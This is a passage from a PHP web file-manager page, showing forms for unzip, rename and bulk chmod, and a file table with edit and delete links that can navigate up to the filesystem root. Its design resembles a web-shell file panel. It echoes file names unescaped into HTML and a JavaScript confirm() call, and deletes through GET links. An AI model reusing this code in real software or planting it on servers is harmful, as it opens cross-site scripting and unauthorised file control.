                                    <?php echo $zipFile; ?>
                                </option>
                                <?php endforeach; ?>
                            </select>
                            <input type="text" name="extract_path" class="form-control" placeholder="Extract to folder (optional)">
                            <button type="submit" name="unzip_file" class="btn btn-primary">Unzip</button>
                        </form>
                    </div>
                    <?php endif; ?>
                    
                    <!-- Rename Item -->
                    <div class="action-card">
                        <div class="action-header">
                            <div class="action-icon">✏️</div>
                            <div class="action-title">Rename Item</div>
                        </div>
                        <form method="POST" class="form-group">
                            <select name="rename_old" class="form-control" required>
                                <option value="">Select item...</option>
                                <?php foreach (array_merge($folders, $files) as $item): ?>
                                <option value="<?php echo $item; ?>"><?php echo $item; ?></option>
                                <?php endforeach; ?>
                            </select>
                            <input type="text" name="rename_new" class="form-control" placeholder="New name" required>
                            <button type="submit" class="btn btn-primary">Rename</button>
                        </form>
                    </div>
                </div>
            </div>
            
            <!-- Chmod Operations -->
            <div class="action-category">
                <div class="category-title">Chmod Operations</div>
                <div class="actions-grid">
                    <!-- Chmod Single File -->
                    <div class="action-card">
                        <div class="action-header">
                            <div class="action-icon">📄</div>
                            <div class="action-title">Chmod Single File</div>
                        </div>
                        <form method="POST" class="form-group">
                            <input type="hidden" name="chmod_type" value="single_file">
                            <select name="chmod_target" class="form-control" required>
                                <option value="">Select file...</option>
                                <?php foreach ($files as $file): ?>
                                <option value="<?php echo $currentPath . '/' . $file; ?>">
                                    <?php echo $file; ?>
                                </option>
                                <?php endforeach; ?>
                            </select>
                            <input type="text" name="chmod_value" class="form-control" placeholder="0644" required>
                            <button type="submit" class="btn btn-primary">Apply</button>
                        </form>
                    </div>
                    
                    <!-- Chmod Single Folder -->
                    <div class="action-card">
                        <div class="action-header">
                            <div class="action-icon">📁</div>
                            <div class="action-title">Chmod Single Folder</div>
                        </div>
                        <form method="POST" class="form-group">
                            <input type="hidden" name="chmod_type" value="single_folder">
                            <select name="chmod_target" class="form-control" required>
                                <option value="">Select folder...</option>
                                <?php foreach ($folders as $folder): ?>
                                <option value="<?php echo $currentPath . '/' . $folder; ?>">
                                    <?php echo $folder; ?>
                                </option>
                                <?php endforeach; ?>
                            </select>
                            <input type="text" name="chmod_value" class="form-control" placeholder="0755" required>
                            <button type="submit" class="btn btn-primary">Apply</button>
                        </form>
                    </div>
                    
                    <!-- Chmod All Items -->
                    <div class="action-card">
                        <div class="action-header">
                            <div class="action-icon">🔨</div>
                            <div class="action-title">Chmod All Items</div>
                        </div>
                        <form method="POST" class="form-group">
                            <input type="hidden" name="chmod_type" value="all">
                            <input type="hidden" name="chmod_target" value="<?php echo $currentPath; ?>">
                            <input type="text" name="chmod_value" class="form-control" placeholder="0755" required>
                            <button type="submit" class="btn btn-primary">Apply to All</button>
                        </form>
                    </div>
                    
                    <!-- Chmod All Directories -->
                    <div class="action-card">
                        <div class="action-header">
                            <div class="action-icon">📂</div>
                            <div class="action-title">Chmod All Directories</div>
                        </div>
                        <form method="POST" class="form-group">
                            <input type="hidden" name="chmod_type" value="dirs">
                            <input type="hidden" name="chmod_target" value="<?php echo $currentPath; ?>">
                            <input type="text" name="chmod_value" class="form-control" placeholder="0755" required>
                            <button type="submit" class="btn btn-primary">Apply to Dirs</button>
                        </form>
                    </div>
                    
                    <!-- Chmod All Files -->
                    <div class="action-card">
                        <div class="action-header">
                            <div class="action-icon">📋</div>
                            <div class="action-title">Chmod All Files</div>
                        </div>
                        <form method="POST" class="form-group">
                            <input type="hidden" name="chmod_type" value="files">
                            <input type="hidden" name="chmod_target" value="<?php echo $currentPath; ?>">
                            <input type="text" name="chmod_value" class="form-control" placeholder="0644" required>
                            <button type="submit" class="btn btn-primary">Apply to Files</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="file-table">
            <table class="table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if ($currentPath !== '/'): ?>
                    <tr>
                        <td>
                            <a href="?path=<?php echo urlencode(dirname($currentPath)); ?>" class="file-name">
                                <span class="file-icon">⬆️</span>
                                <span>..</span>
                            </a>
                        </td>
                        <td class="file-size">-</td>
                        <td>-</td>
                        <td class="file-date">-</td>
                        <td>-</td>
                    </tr>
                    <?php endif; ?>
                    
                    <?php 
                    // Show folders first, then files
                    $allItems = array_merge($folders, $files);
                    foreach ($allItems as $item): 
                        $itemPath = $currentPath . '/' . $item;
                        $isDir = is_dir($itemPath);
                        $isZip = !$isDir && strtolower(pathinfo($item, PATHINFO_EXTENSION)) === 'zip';
                        $icon = $isDir ? '📁' : ($isZip ? '📦' : '📄');
                        $size = $isDir ? '-' : formatSize(filesize($itemPath));
                        $perms = getFilePermissions($itemPath);
                        $modified = date('Y-m-d H:i', filemtime($itemPath));
                    ?>
                    <tr>
                        <td>
                            <?php if ($isDir): ?>
                            <a href="?path=<?php echo urlencode($itemPath); ?>" class="file-name">
                                <span class="file-icon"><?php echo $icon; ?></span>
                                <span><?php echo htmlspecialchars($item); ?></span>
                            </a>
                            <?php else: ?>
                            <span class="file-name">
                                <span class="file-icon"><?php echo $icon; ?></span>
                                <span><?php echo htmlspecialchars($item); ?></span>
                                <?php if ($isZip): ?>
                                <span class="zip-badge">ZIP</span>
                                <?php endif; ?>
                            </span>
                            <?php endif; ?>
                        </td>
                        <td class="file-size"><?php echo $size; ?></td>
                        <td><span class="permissions-badge"><?php echo $perms; ?></span></td>
                        <td class="file-date"><?php echo $modified; ?></td>
                        <td>
                            <div class="file-actions">
                                <?php if (!$isDir): ?>
                                <a href="?path=<?php echo urlencode($currentPath); ?>&edit=<?php echo urlencode($itemPath); ?>" 
                                   class="btn btn-sm btn-secondary">Edit</a>
                                <?php endif; ?>
                                <a href="?path=<?php echo urlencode($currentPath); ?>&delete=<?php echo urlencode($itemPath); ?>" 
                                   class="btn btn-sm btn-danger" 
                                   onclick="return confirm('Are you sure you want to delete: <?php echo $item; ?>?')">Delete</a>
                            </div>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>